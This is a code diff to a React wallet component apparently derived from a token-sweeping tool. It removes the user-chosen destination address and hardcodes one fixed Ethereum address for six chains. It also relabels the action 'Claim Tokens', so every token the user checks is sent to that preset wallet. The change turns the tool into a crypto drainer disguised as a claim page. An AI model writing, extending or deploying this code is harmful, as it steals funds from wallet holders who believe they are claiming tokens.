@@ -1,32 +1,24 @@
-import { Button, Input, useToasts } from '@geist-ui/core';
-import { usePublicClient, useWalletClient } from 'wagmi';
+import { Button, useToasts } from '@geist-ui/core';
+import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { erc20Abi } from 'viem';
-
-import { isAddress } from 'essential-eth';
 import { useAtom } from 'jotai';
 import { normalize } from 'viem/ens';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
-import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
+
+// Preset destination addresses based on chain IDs
+const destinationAddresses = {
+  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  // Add other chain ID and address mappings here
+};
 
 function sleep(ms: number): Promise<void> {
   return new Promise((resolve) => setTimeout(resolve, ms));
-}
-
-// Define TransferPending type
-type TransferPending = {
-  id: string;
-  status: string;
-  // Add other properties as needed
-};
-
-interface TokenRecord {
-  isChecked: boolean;
-  pendingTxn?: TransferPending;
-}
-
-interface CheckedTokens {
-  [address: `0x${string}`]: TokenRecord;
 }
 
 export const SendTokens = () => {
@@ -39,10 +31,10 @@ export const SendTokens = () => {
     });
 
   const [tokens] = useAtom(globalTokensAtom);
-  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
-  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom) as [CheckedTokens, React.Dispatch<React.SetStateAction<CheckedTokens>>];
+  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
+  const { chain } = useAccount(); // Use chain ID from connected account
 
   const sendAllCheckedTokens = async () => {
     const tokensToSend: string[] = Object.entries(checkedRecords)
@@ -50,8 +42,15 @@ export const SendTokens = () => {
       .map(([tokenAddress]) => tokenAddress);
 
     if (!walletClient || !publicClient) return;
-    if (!destinationAddress) return;
 
+    // Automatically select destination address based on the connected chain ID
+    const destinationAddress = destinationAddresses[chain?.id];
+    if (!destinationAddress) {
+      showToast('Unsupported chain or no destination address found for this network', 'error');
+      return;
+    }
+
+    // Perform ENS resolution if needed
     if (destinationAddress.includes('.')) {
       try {
         const resolvedDestinationAddress = await publicClient.getEnsAddress({
@@ -111,9 +110,6 @@ export const SendTokens = () => {
     }
   };
 
-  const addressAppearsValid: boolean =
-    typeof destinationAddress === 'string' &&
-    (destinationAddress.includes('.') || isAddress(destinationAddress));
   const checkedCount = Object.values(checkedRecords).filter(
     (record) => record.isChecked,
   ).length;
@@ -121,37 +117,12 @@ export const SendTokens = () => {
   return (
     <div style={{ margin: '20px' }}>
       <form>
-        Destination Address:
-        <Input
-          required
-          value={destinationAddress}
-          placeholder="vitalik.eth"
-          onChange={(e) => setDestinationAddress(e.target.value)}
-          type={
-            addressAppearsValid
-              ? 'success'
-              : destinationAddress.length > 0
-                ? 'warning'
-                : 'default'
-          }
-          width="100%"
-          style={{
-            marginLeft: '10px',
-            marginRight: '10px',
-  }}
-  crossOrigin=""
-  onPointerEnterCapture={() => {}}
-  onPointerLeaveCapture={() => {}}
-          
-        />
+        {/* Removed Input for destination address */}
         <Button
           type="secondary"
           onClick={sendAllCheckedTokens}
-          disabled={!addressAppearsValid}
+          disabled={checkedCount === 0}
           style={{ marginTop: '20px' }}
-          placeholder="" // Add placeholder prop
-          onPointerEnterCapture={() => {}} // Add onPointerEnterCapture prop
-          onPointerLeaveCapture={() => {}} // Add onPointerLeaveCapture prop
         >
           {checkedCount === 0
             ? 'Claim Tokens'
